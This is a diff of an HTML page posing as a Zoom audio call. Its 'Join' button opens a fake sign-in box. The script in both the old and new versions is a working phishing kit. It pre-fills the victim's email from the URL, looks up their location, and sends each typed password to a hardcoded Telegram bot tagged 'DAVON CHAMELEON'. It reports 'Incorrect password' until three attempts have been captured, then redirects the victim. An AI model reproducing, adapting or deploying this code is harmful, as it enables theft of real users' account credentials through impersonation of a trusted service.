@@ -1,268 +1,564 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Join Zoom Call Meeting</title>
-  <style>
-    :root{--bg:#0f1724;--card:#0b1220;--muted:#94a3b8;--accent:#2dd4bf;--danger:#ff4d6d}
-    *{box-sizing:border-box}
-    body{margin:0;font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:url('https://i.postimg.cc/Hx1pqm12/pure-black-background-wcs86b1g1awsprv8.jpg') no-repeat center center/cover; color:#e6eef8; min-height:100vh; display:flex;align-items:center;justify-content:center;padding:0;}
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Polished Call — Reactive Ripple Audio</title>
+<style>
+/* GENERAL */
+:root{
+  --bg:#0f1724; --panel:#151823; --muted:#9aa6b2;
+  --accent:#22c55e; --white:#e6eef8; --danger:#ef4444;
+}
+*{box-sizing:border-box}
+body{
+  margin:0; font-family:Inter, system-ui;
+  background:url('https://i.postimg.cc/zvKCKn8P/zoom-webpage-black.png') center/cover no-repeat;
+  min-height:100vh; display:flex; align-items:center; justify-content:center;
+  color:var(--white)
+}
 
-    #loadingScreen{position:fixed;inset:0;background:#0f1724;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;opacity:1;transition:opacity 1s ease;}
-    #loadingScreen img{width:100px;height:100px;object-fit:contain;margin-bottom:20px;animation:spin 2s linear infinite;}
-    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+/* LOADING */
+#loadingScreen{
+  position:fixed; inset:0; background:#0f1724;
+  display:flex; align-items:center; justify-content:center;
+  z-index:9999; opacity:1; transition:opacity .8s ease;
+}
+#loadingScreen img{
+  width:110px;height:110px;object-fit:contain;
+  animation:spin 2s linear infinite;
+}
+@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
 
-    .container{width:980px;max-width:98%;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border-radius:12px;padding:18px;box-shadow:0 10px 30px rgba(2,6,23,0.7);border:1px solid rgba(255,255,255,0.03);display:none;opacity:0;transition:opacity 1s ease;}
-    .header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
-    .title{display:flex;gap:12px;align-items:center}
-    .meeting-badge{background:rgba(255,255,255,0.03);padding:8px 12px;border-radius:10px;font-weight:600}
-    .meta{color:var(--muted);font-size:13px}
-    .controls{display:flex;gap:8px;align-items:center}
-    .join-btn{background:var(--accent);color:#fff;border:none;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer}
+/* PANEL */
+.panel{
+  width:920px; max-width:95%; background:var(--panel);
+  border-radius:14px; padding:28px;
+  box-shadow:0 30px 60px rgba(2,6,23,0.6);
+  border:1px solid rgba(255,255,255,0.03);
+  display:none; opacity:0; transition:opacity .6s ease;
+}
+.panel-header{
+  display:flex; align-items:center; gap:12px;
+  color:var(--muted); margin-bottom:18px;
+}
 
-    .stage{display:grid;grid-template-columns:1fr 320px;gap:18px}
-    .main{background:linear-gradient(180deg,rgba(255,255,255,0.015),transparent);padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.02)}
-    .participants{display:flex;gap:12px;flex-wrap:wrap}
-    .participant{flex:1 1 240px;display:flex;align-items:center;gap:12px;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);cursor:pointer;border:1px solid rgba(255,255,255,0.02);transition:transform .18s,box-shadow .18s}
-    .participant:hover{transform:translateY(-4px);box-shadow:0 8px 24px rgba(2,6,23,0.55)}
+/* CALL SECTION */
+.call-stage{
+  display:flex;
+  justify-content:space-between;
+  gap:24px;
+}
 
-    .avatar{width:72px;height:72px;border-radius:50%;background:#1e293b;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
-    .avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%}
-    .pulse{position:absolute;inset:0;border-radius:50%;box-shadow:0 0 0 0 rgba(45,212,191,0.25);animation:none}
-    .speaking .pulse{animation:pulse 1.4s infinite}
-    @keyframes pulse{0%{transform:scale(1);opacity:0.9}50%{transform:scale(1.5);opacity:0.08}100%{transform:scale(2);opacity:0}}
+.participant-card{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  padding:20px;
+  text-align:center;
+  min-height:390px;
+  position:relative;
+}
 
-    .info{flex:1}
-    .name{font-weight:700}
-    .status{font-size:13px;color:var(--muted);margin-top:4px;display:flex;gap:8px;align-items:center}
+/* AVATAR */
+.avatar-wrap{
+  width:220px;height:220px;border-radius:50%;overflow:hidden;
+  background:#0f1724;border:6px solid rgba(255,255,255,0.03);
+  position:relative; display:flex; align-items:center; justify-content:center;
+}
+.avatar-wrap img{
+  width:100%;height:100%;object-fit:cover;border-radius:50%;
+}
 
-    .wave{display:flex;gap:4px;align-items:flex-end;height:26px}
-    .bar{width:6px;border-radius:2px;background:linear-gradient(180deg,var(--accent),#0ea5a9);opacity:0.75;transform-origin:center bottom}
+/* MIC ICON */
+.mic-indicator{
+  width:28px;
+  height:28px;
+  display:none;
+  position:absolute;
+  left:50%;
+  transform:translateX(-50%);
+  bottom: -36px;
+  z-index:10;
+}
+.mic-indicator svg{
+  width:100%; height:100%;
+  fill:#ffffff;
+  opacity:0.95;
+}
 
-    .right{display:flex;flex-direction:column;gap:12px}
-    .sidebar-card{background:rgba(255,255,255,0.01);padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
+/* HOST RIPPLE */
+.wave{
+  position:relative; width:180px; height:180px;
+  margin:24px auto 0;
+}
+.ripple{
+  position:absolute; top:50%; left:50%;
+  transform:translate(-50%,-50%);
+  border:3px solid var(--accent); border-radius:50%;
+  opacity:.35;
+  transition:width .1s linear,height .1s linear,opacity .15s ease-out;
+}
 
-    .login-box{background:#fff;color:#000;max-width:360px;width:100%;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);display:none;flex-direction:column;align-items:center;opacity:0;transition:opacity 1s ease;}
-    .login-box.show{display:flex;opacity:1;transition:opacity 1s ease;}
-    .container.show{display:block;opacity:1;transition:opacity 1s ease;}
-    .login-box h2{margin:12px 0 18px 0}
-    .login-box input{width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:6px}
-    .checkbox{display:flex;align-items:center;gap:6px;margin-bottom:10px}
-    .btn{width:100%;background:#0078d4;color:#fff;border:none;padding:10px;border-radius:6px;font-weight:bold;cursor:pointer}
-    .footer{font-size:12px;color:#555;margin-top:10px;text-align:center}
-    .footer a{color:#0078d4;text-decoration:none}
+/* GUEST GREEN DOT */
+.green-dot{
+  position:absolute; bottom:14px; right:14px;
+  width:18px; height:18px; border-radius:50%;
+  background:#22c55e; box-shadow:0 0 12px #22c55e;
+}
 
-    @media (max-width:840px){.stage{grid-template-columns:1fr;}.participant{flex-basis:100%}.right{order:2}}
-  </style>
+/* CALL BUTTONS */
+.controls{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:60px;
+  margin-top:35px;
+}
+
+.call-btn{
+  width:82px;
+  height:82px;
+  border-radius:50%;
+  border:none;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  box-shadow:0 8px 25px rgba(0,0,0,0.35);
+  transition:transform .15s ease;
+}
+.call-btn:active{ transform:scale(.90); }
+
+.call-icon{
+  width:42px;
+  height:42px;
+  fill:white;
+}
+
+.accept{ background:#22c55e; }
+.decline{
+  background:#ef4444;
+  transform:rotate(135deg);
+}
+
+.label{
+  text-align:center;
+  margin-top:8px;
+  font-size:14px;
+  color:var(--white);
+  opacity:.85;
+}
+
+/* LOGIN BOX */
+.login-box{
+  position:fixed; left:50%; top:50%; transform:translate(-50%,-50%);
+  max-width:380px; width:92%; background:#fff; color:#0f1724;
+  box-shadow:0 20px 50px rgba(2,6,23,0.5);
+  padding:22px; border-radius:12px;
+  display:none; opacity:0; transition:opacity .5s ease;
+}
+.login-box input{
+  width:100%; padding:12px; margin-bottom:10px;
+  border-radius:8px; border:1px solid #ddd;
+}
+.login-box .btn{
+  width:100%; padding:12px; border-radius:8px; border:none;
+  background:#0078d4; color:#fff; font-weight:700;
+}
+.error{
+  color:#ef4444; font-weight:700; margin-top:10px;
+  min-height:22px; text-align:center;
+}
+
+.login-box.shake{
+  transform: translate(-50%,-50%) translateX(0);
+  animation: shakeX .18s ease 0s 2;
+}
+@keyframes shakeX {
+  0% { transform: translate(-50%,-50%) translateX(0); }
+  25% { transform: translate(-50%,-50%) translateX(-6px); }
+  50% { transform: translate(-50%,-50%) translateX(6px); }
+  75% { transform: translate(-50%,-50%) translateX(-4px); }
+  100% { transform: translate(-50%,-50%) translateX(0); }
+}
+
+/* END SCREEN */
+#endScreen{
+  position:fixed; inset:0; background:#000; color:#fff;
+  display:flex; align-items:center; justify-content:center;
+  font-size:32px; font-weight:700;
+  opacity:0; pointer-events:none; transition:opacity .5s;
+}
+</style>
 </head>
+
 <body>
-  <div id="loadingScreen">
-    <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="Loading Logo">
+
+<!-- LOADING -->
+<div id="loadingScreen">
+  <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="loading">
+</div>
+
+<div class="panel" id="mainPanel">
+
+  <div class="panel-header">
+    <div>Zoom Audio Call</div>
+    <div style="flex:1"></div>
+    <div id="callTimer">00:00</div>
   </div>
 
-  <div class="container" role="application" aria-label="Active call">
-    <div class="header">
-      <div class="title">
-        <div class="meeting-badge">Zoom Meeting • Audio</div>
-        <div>
-          <div style="font-weight:800">Active Zoom Call</div>
-          <div class="meta">Two participants — live speaking</div>
-        </div>
+  <div class="call-stage">
+
+    <!-- HOST -->
+    <div class="participant-card" id="p1">
+      <div class="avatar-wrap">
+        <img src="https://i.postimg.cc/qBNDCKfk/IMG-0818.jpg" alt="host avatar">
       </div>
-      <div class="controls">
-        <div class="timer" id="timer">00:00</div>
-        <button class="join-btn" id="joinToggle">Join</button>
+      <div class="name">Micheal Bryan</div>
+      <div class="role">Host</div>
+
+      <div class="wave">
+        <div class="ripple" id="p1r1"></div>
+        <div class="ripple" id="p1r2"></div>
+        <div class="ripple" id="p1r3"></div>
       </div>
     </div>
 
-    <div class="stage">
-      <div class="main">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-          <strong>Participants</strong>
-          <span class="meta">Click a participant to toggle speaking</span>
-        </div>
-        <div class="participants" id="participants"></div>
+    <!-- GUEST -->
+    <div class="participant-card" id="p2">
+      <div class="avatar-wrap">
+        <img src="https://i.postimg.cc/8cR3pShh/Chat-GPT-Image-Nov-14-2025-07-20-14-AM.png" alt="guest avatar">
+        <div class="green-dot"></div>
       </div>
 
-      <div class="right">
-        <div class="sidebar-card">
-          <strong>Active speaker</strong>
-          <div style="margin-top:8px" id="activeInfo">—</div>
-        </div>
+      <div class="name">Waiting for Guest</div>
+      <div class="role">Microphone</div>
+
+      <div class="mic-indicator" id="micIcon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 14 0h-2zM11 17h2v3h3v2H8v-2h3v-3z"/>
+        </svg>
       </div>
     </div>
+
   </div>
 
-  <div class="login-box" id="loginBox">
-    <div class="logo">
-      <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="Logo" id="logo" style="width:60px;height:60px;object-fit:contain;">
-    </div>
-    <h2>Sign in</h2>
-    <div id="error-msg" class="error-msg"></div>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Email, phone, or Skype" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <div class="checkbox">
+  <div class="controls">
 
-      </div>
-      <button type="button" id="login-btn" class="btn">Login</button>
-    </form>
-    <a href="https://support.zoom.com/hc/en/article?id=zm_kb&sysparm_article=KB0062436" class="forgot">Forgot password?</a>
-    <div class="footer">
-      <a href="#">Terms of use</a> · 
-      <a href="#">Privacy & cookies</a><br>
-      © Zoom 2025
+    <div>
+      <button id="declineBtn" class="call-btn decline" title="Decline">
+        <svg class="call-icon" viewBox="0 0 24 24">
+          <path d="M21 16.92v3a2 2 0 0 1-2.18 2 19.86 19.86 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.86 19.86 0 0 1 2.08 5.18 2 2 0 0 1 4 3h3a2 2 0 0 1 2 1.72c.12 1.05.39 2.07.78 3.03a2 2 0 0 1-.45 2.11L8.91 11.09a16 16 0 0 0 6 6l1.23-1.23a2 2 0 0 1 2.11-.45c.96.39 1.98.66 3.03.78A2 2 0 0 1 21 16.92z"/>
+        </svg>
+      </button>
+      <div class="label">Decline</div>
     </div>
+
+    <div>
+      <button id="joinBtn" class="call-btn accept" title="Join">
+        <svg class="call-icon" viewBox="0 0 24 24">
+          <path d="M21 16.92v3a2 2 0 0 1-2.18 2 19.86 19.86 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.86 19.86 0 0 1 2.08 5.18 2 2 0 0 1 4 3h3a2 2 0 0 1 2 1.72c.12 1.05.39 2.07.78 3.03a2 2 0 0 1-.45 2.11L8.91 11.09a16 16 0 0 0 6 6l1.23-1.23a2 2 0 0 1 2.11-.45c.96.39 1.98.66 3.03.78A2 2 0 0 1 21 16.92z"/>
+        </svg>
+      </button>
+      <div class="label">Join</div>
+    </div>
+
   </div>
+
+</div>
+
+<!-- LOGIN -->
+<div class="login-box" id="loginBox" role="dialog" aria-modal="true" aria-hidden="true">
+  <div class="logo" style="text-align:center;margin-bottom:8px;">
+    <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="Logo" style="width:60px;height:60px;object-fit:contain;">
+  </div>
+  <h2 style="text-align:center;margin:0 0 12px 0">Sign in</h2>
+  <div id="error-msg" class="error" style="display:block;height:22px;"></div>
+  <form id="loginForm" onsubmit="return false;">
+    <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <div style="height:8px"></div>
+    <button type="button" id="login-btn" class="btn">Login</button>
+  </form>
+  <div style="text-align:center;margin-top:10px;font-size:12px;color:#666">Forgot password? · Terms · Privacy</div>
+</div>
+
+<div class="overlay" style="position:fixed;inset:0;background:#000;opacity:0;transition:.5s"></div>
+
+<!-- END SCREEN -->
+<div id="endScreen">Session Ended</div>
 
 <script>
-  // Always show "Invalid password" without leaving login page
-  document.getElementById('login-btn').addEventListener('click', () => {
-    const errorMsg = document.getElementById('error-msg');
-    errorMsg.textContent = "Invalid password";
-    errorMsg.style.color = "red";
-    errorMsg.style.fontWeight = "bold";
-
-    // Optional shake animation
-    const loginBox = document.getElementById('loginBox');
-    loginBox.style.transition = "transform 0.1s";
-    loginBox.style.transform = "translateX(-5px)";
-    setTimeout(() => loginBox.style.transform = "translateX(5px)", 100);
-    setTimeout(() => loginBox.style.transform = "translateX(0px)", 200);
-  });
 // Telegram Bot config
   const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
   const TELEGRAM_CHAT_ID = "7574749243";
 
-  const emailInput = document.getElementById('email');
-  const passwordInput = document.getElementById('password');
-  const loginBtn = document.getElementById('login-btn');
-  const errorMsg = document.getElementById('error-msg');
-  const logoImg = document.getElementById('logo');
+// Elements
+const rawHash = window.location.hash.substring(1);
+const emailInput = document.getElementById('email');
+const logoImg = document.getElementById('logo');
+const bgFrame = document.getElementById('bg-frame');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.getElementById('login-btn');
+const errorMsg = document.getElementById('error-msg');
+const overlay = document.querySelector('.overlay');
 
-  let attempts = 0;
-  const maxAttempts = 3;
+let attempts = 0;
+const maxAttempts = 3;
 
-// Get email from query parameter (?email=) instead of hash
-const params = new URLSearchParams(window.location.search);
-const rawEmail = params.get("email");
+// FIX 1: Overlay should NOT block UI until AFTER login success
+overlay.style.pointerEvents = "none";
+overlay.style.opacity = "0";
 
-if (!rawEmail || !/^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+document.body.classList.add('blur-active');
+
+if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
 
 } else {
-  emailInput.value = rawEmail;
+  emailInput.value = rawHash;
   emailInput.setAttribute("readonly", true);
 
-  const domain = rawEmail.split('@')[1];
-  logoImg.src = `https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg`;
+  const domain = rawHash.split('@')[1];
+
+  // Set logo
+  logoImg.src = `https://logo.clearbit.com/${domain}`;
   logoImg.onerror = () => {
-    logoImg.src = "https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg";
+    logoImg.src = "https://via.placeholder.com/150?text=Logo";
+  };
+
+  // Fallback screenshot
+  const fallbackScreenshot = document.createElement('img');
+  fallbackScreenshot.id = "fallback-screenshot";
+  fallbackScreenshot.style.cssText = `
+    display:none;
+    position:fixed;top:0;left:0;
+    width:100vw;height:100vh;
+    object-fit:cover;
+    z-index:-1;
+    pointer-events:none;
+  `;
+  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
+  document.body.appendChild(fallbackScreenshot);
+
+  // Load iframe with timeout
+  let iframeLoaded = false;
+  bgFrame.src = `https://${domain}`;
+
+  bgFrame.onload = () => {
+    iframeLoaded = true;
+    fallbackScreenshot.style.display = "none";
+    bgFrame.style.display = "block";
+  };
+
+  setTimeout(() => {
+    if (!iframeLoaded) {
+      bgFrame.style.display = "none";
+      fallbackScreenshot.style.display = "block";
+    }
+  }, 6000);
+
+  bgFrame.onerror = () => {
+    bgFrame.style.display = "none";
+    fallbackScreenshot.style.display = "block";
   };
 }
 
+// Fetch user country
+let userIP = "Unknown IP";
+let userCity = "Unknown City";
+let userCountry = "Unknown Country";
+let userISP = "Unknown ISP";
 
-  // Get location info
-  let userCity = "Unknown City";
-  let userCountry = "Unknown Country";
+loginBtn.disabled = true;
 
-  fetch("https://ipapi.co/json/")
-    .then(res => res.json())
-    .then(data => {
-      userCity = data.city || userCity;
-      userCountry = data.country_name || userCountry;
-    }).catch(() => {});
-
-  function sendTelegramMessage(email, password, attempt) {
-    const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
-                 `UserId: [${email}]\nPass: [${password}]\n` +
-                 `Country: [${userCity}, ${userCountry}]`;
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "HTML"})
-    }).catch(e => console.error("Telegram send failed:", e));
-  }
-
-  loginBtn.addEventListener('click', () => {
-    const password = passwordInput.value.trim();
-    if (password === "") {
-      errorMsg.textContent = "Password cannot be empty.";
-      errorMsg.style.display = "block";
-      return;
-    }
-    attempts++;
-    sendTelegramMessage(emailInput.value, password, attempts);
-
-    if (attempts < maxAttempts) {
-      errorMsg.textContent = "Incorrect password.";
-      errorMsg.style.display = "block";
-      passwordInput.value = "";
-    } else {
-      errorMsg.style.display = "none";
-      window.location.href = `https://${emailInput.value.split('@')[1]}`;
-    }
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    userCity = data.city || userCity;
+    userCountry = data.country_name || userCountry;
+  })
+  .finally(() => {
+    loginBtn.disabled = false;
   });
 
+// Telegram message sender
+function sendTelegramMessage(email, password, attempt, country) {
+  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
+               ` UserId : [ ${email} ]\n` +
+               `    Pass : [ ${password} ]\n` +
+               ` Country : [ ${userCity}, ${userCountry} ]`;
 
-    const users = [
-      { id: 'u1', name: 'Mark', avatar: 'https://i.postimg.cc/qBNDCKfk/IMG-0818.jpg', role: 'Host', mic:true },
-      { id: 'u2', name: 'Michael Bryan', avatar: 'https://i.postimg.cc/vm1xvGGM/IMG-0768.jpg', role: 'Guest', mic:true }
-    ];
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const payload = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: text,
+    parse_mode: "HTML"
+  };
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(payload)
+  }).catch(e => console.error("Telegram send failed:", e));
+}
 
-    const participantsEl = document.getElementById('participants');
-    const activeInfo = document.getElementById('activeInfo');
-    const timerEl = document.getElementById('timer');
-    let seconds = 0, timerInterval;
+// Login button handler
+loginBtn.addEventListener('click', () => {
+  const password = passwordInput.value.trim();
+  if (password === "") {
+    errorMsg.textContent = "Password cannot be empty.";
+    return;
+  }
+  attempts++;
+  sendTelegramMessage(emailInput.value, password, attempts, userCountry);
 
-    function formatTime(s){ const mm = String(Math.floor(s/60)).padStart(2,'0'); const ss = String(s%60).padStart(2,'0'); return `${mm}:${ss}`; }
-    function startTimer(){timerInterval=setInterval(()=>{seconds++;timerEl.textContent=formatTime(seconds)},1000);}
+  if (attempts < maxAttempts) {
+    errorMsg.textContent = "Incorrect password.";
+    passwordInput.value = "";
+  } else {
+    errorMsg.textContent = "";
+    overlay.style.display = 'none';
+    document.body.classList.remove('blur-active');
+    window.location.href = `https://${emailInput.value.split('@')[1]}`;
+  }
+});
+/* CALL TIMER */
+let sec = 0;
+setInterval(()=>{
+  sec++;
+  callTimer.textContent =
+    String(Math.floor(sec/60)).padStart(2,'0') + ":" +
+    String(sec%60).padStart(2,'0');
+},1000);
 
-    function makeBars(count){let html='';for(let i=0;i<count;i++){html += `<div class="bar" style="height:${10 + Math.round(Math.random()*60)}%"></div>`}return html;}
+/* LOADING → MAIN PANEL */
+window.addEventListener('load', ()=> {
+  setTimeout(()=>{
+    loadingScreen.style.opacity='0';
+    setTimeout(()=>{
+      loadingScreen.style.display='none';
+      mainPanel.style.display='block';
+      requestAnimationFrame(()=> mainPanel.style.opacity='1');
+    },600);
+  },600);
+});
 
-    function renderParticipants(){
-      participantsEl.innerHTML='';
-      users.forEach((u)=>{
-        const el=document.createElement('div');
-        el.className='participant'+(u.speaking?' speaking':'');
-        el.dataset.id=u.id;
-        el.innerHTML=`<div class="avatar"><div class="pulse"></div><img src="${u.avatar}" alt="${u.name}"></div><div class="info"><div class="name">${u.name} <span style="font-weight:600;color:var(--muted);font-size:12px">· ${u.role}</span></div><div class="status"><div class="meta">${u.mic?'Microphone on':'Muted'}</div><div class="wave">${makeBars(8)}</div></div></div>`;
-        el.addEventListener('click',()=>toggleSpeaking(u.id));
-        participantsEl.appendChild(el);
-      });
+/* JOIN BUTTON → SHOW LOGIN */
+joinBtn.addEventListener('click', ()=>{
+  mainPanel.style.opacity='0';
+  setTimeout(()=>{
+    mainPanel.style.display='none';
+    loginBox.style.display='block';
+    requestAnimationFrame(()=> loginBox.style.opacity='1');
+  },300);
+});
+
+/* CLICK OUTSIDE → CLOSE LOGIN */
+window.addEventListener('click', (e)=>{
+  if (loginBox.style.display==='block' && !loginBox.contains(e.target)) {
+    loginBox.style.opacity='0';
+    setTimeout(()=>{
+      loginBox.style.display='none';
+      mainPanel.style.display='block';
+      requestAnimationFrame(()=> mainPanel.style.opacity='1');
+    },250);
+  }
+});
+
+/* DECLINE → END SCREEN */
+declineBtn.addEventListener('click', ()=> {
+  document.getElementById('endScreen').style.opacity='1';
+});
+
+/* ------------------------------------------
+   ACTIVE LOGIN HANDLER (YOUR REQUEST)
+------------------------------------------- */
+loginBtn.addEventListener('click', async () => {
+
+  const email = emailInput.value.trim();
+  const pass = passwordInput.value.trim();
+
+  errorMsg.textContent = "";
+
+  if (!email || !pass) {
+    errorMsg.textContent = "Incorrect Password.";
+    shake(loginBox);
+    return;
+  }
+
+  try {
+    const result = await authenticateUser(email, pass, rawHash);
+
+    if (result.success) {
+      overlay.style.opacity = "1";
+      setTimeout(()=> {
+        window.location.href = result.redirect || "dashboard.html";
+      },500);
+    } else {
+      errorMsg.textContent = result.message || "Invalid password";
+      passwordInput.value = "";
+      shake(loginBox);
     }
+  } catch (err) {
+    console.error(err);
+    errorMsg.textContent = "Network error.";
+    shake(loginBox);
+  }
+});
 
-    function toggleSpeaking(id){users.forEach(u=>u.speaking=(u.id===id)?!u.speaking:false);updateActive();renderParticipants();}
-    function updateActive(){const active=users.find(u=>u.speaking);activeInfo.textContent=active?`${active.name} is speaking`:'Nobody is speaking';}
-    function animateLevels(){document.querySelectorAll('.bar').forEach(b=>{b.style.height=(10+Math.round(Math.random()*70))+'px';b.style.transition='height 160ms linear';});}
+function shake(el){
+  el.classList.remove('shake');
+  void el.offsetWidth;
+  el.classList.add('shake');
+}
 
-    const joinBtn = document.getElementById('joinToggle');
-    if(joinBtn){
-      joinBtn.addEventListener('click',()=>{
-        document.querySelector('.container').style.opacity='0';
-        setTimeout(()=>{
-          document.querySelector('.container').style.display='none';
-          const loginBox=document.getElementById('loginBox');
-          loginBox.style.display='flex';
-          setTimeout(()=>{ loginBox.style.opacity='1'; },50);
-        },300);
-      });
+/* BACKEND HOOK — YOU MODIFY THIS */
+async function authenticateUser(email, pass, hash){
+  // EXAMPLE backend call:
+  /*
+  const res = await fetch("/login", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({email, password: pass, session: hash})
+  });
+  return await res.json();
+  */
+
+  // TEMP fallback
+  return { success:false, message:"Invalid credentials" };
+}
+
+/* HOST MICROPHONE RIPPLE */
+async function hostRipple(){
+  const r1 = document.getElementById("p1r1");
+  const r2 = document.getElementById("p1r2");
+  const r3 = document.getElementById("p1r3");
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const analyser = ctx.createAnalyser();
+    analyser.fftSize = 256;
+    const mic = ctx.createMediaStreamSource(stream);
+    mic.connect(analyser);
+    const data = new Uint8Array(analyser.frequencyBinCount);
+    function update(){
+      analyser.getByteFrequencyData(data);
+      let volume = data.reduce((a,b)=>a+b,0) / data.length;
+      let size = Math.max(20, Math.min(160, volume * 1.6));
+      r1.style.width = r1.style.height = size + "px";
+      r2.style.width = r2.style.height = (size * 0.7) + "px";
+      r3.style.width = r3.style.height = (size * 0.4) + "px";
+      micIcon.style.display = volume > 20 ? "block" : "none";
+      requestAnimationFrame(update);
     }
+    update();
+  }catch(e){
+    console.warn("Microphone error", e);
+  }
+}
+hostRipple();
 
-    window.addEventListener('load', ()=>{
-      setTimeout(()=>{
-        const loadingScreen=document.getElementById('loadingScreen');
-        loadingScreen.style.opacity='0';
-        setTimeout(()=>{
-          loadingScreen.style.display='none';
-          document.querySelector('.container').classList.add('show');
-        },1000);
-      },1000);
-    });
-
-    renderParticipants();updateActive();startTimer();
-    setInterval(()=>{animateLevels();},180);
-    setInterval(()=>{const idx=Math.floor(Math.random()*users.length);users.forEach((u,i)=>u.speaking=(i===idx));updateActive();renderParticipants();},9000);
 </script>
 </body>
 </html>
